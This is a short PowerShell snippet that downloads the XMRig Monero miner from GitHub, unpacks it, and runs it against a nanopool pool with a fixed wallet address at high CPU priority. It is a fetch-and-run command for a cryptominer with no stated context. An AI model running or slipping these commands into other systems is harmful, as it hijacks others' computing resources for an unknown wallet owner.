Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip
.\xmrig\xmrig-6.21.3\xmrig.exe -o xmr-eu1.nanopool.org:10300 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
